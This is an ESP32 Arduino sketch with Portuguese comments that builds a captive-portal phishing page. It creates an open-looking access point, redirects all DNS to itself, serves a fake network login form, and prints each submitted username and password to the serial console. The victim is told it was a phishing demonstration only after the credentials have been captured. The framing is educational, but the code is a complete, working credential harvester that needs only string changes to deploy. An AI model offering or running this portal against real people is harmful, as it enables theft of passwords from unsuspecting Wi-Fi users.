#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

const char* AP_SSID = "teste-EvTw";
const char* AP_PASS = "12345678";

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);

DNSServer dnsServer;
WebServer webServer(80);

// Pagina com o formulario de login (demonstracao)
void handleRoot() {
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<title>Login</title></head><body>";
  html += "<h2>Acesso a Rede</h2>";
  html += "<p>Faca login para continuar</p>";
  html += "<form action='/login' method='POST'>";
  html += "Usuario:<br><input type='text' name='usuario'><br><br>";
  html += "Senha:<br><input type='password' name='senha'><br><br>";
  html += "<input type='submit' value='Entrar'>";
  html += "</form></body></html>";
  webServer.send(200, "text/html", html);
}

// Recebe os dados enviados pelo formulario
void handleLogin() {
  String usuario = webServer.arg("usuario");
  String senha   = webServer.arg("senha");

  Serial.println("------ EVENTO DE LOGIN (DEMO) ------");
  Serial.print("[DADOS] Usuario: ");
  Serial.println(usuario);
  Serial.print("[DADOS] Senha..: ");
  Serial.println(senha);
  Serial.println("------------------------------------");

  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<title>OK</title></head><body>";
  html += "<h2>Conectado!</h2>";
  html += "<p>Esta era uma demonstracao de phishing. Nunca digite senhas reais em portais assim.</p>";
  html += "</body></html>";
  webServer.send(200, "text/html", html);
}

void setup() {
  Serial.begin(9600);
  delay(500);
  Serial.println();
  Serial.println("[BOOT] Iniciando ESP32...");

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID, AP_PASS);
  Serial.print("[AP] IP do ESP32: ");
  Serial.println(WiFi.softAPIP());

  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println("[DNS] Servidor DNS iniciado");

  webServer.on("/", HTTP_GET, handleRoot);
  webServer.on("/login", HTTP_POST, handleLogin);
  webServer.onNotFound(handleRoot);
  webServer.begin();
  Serial.println("[WEB] Servidor HTTP iniciado");
  Serial.println("[OK] Portal pronto. Conecte um celular.");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}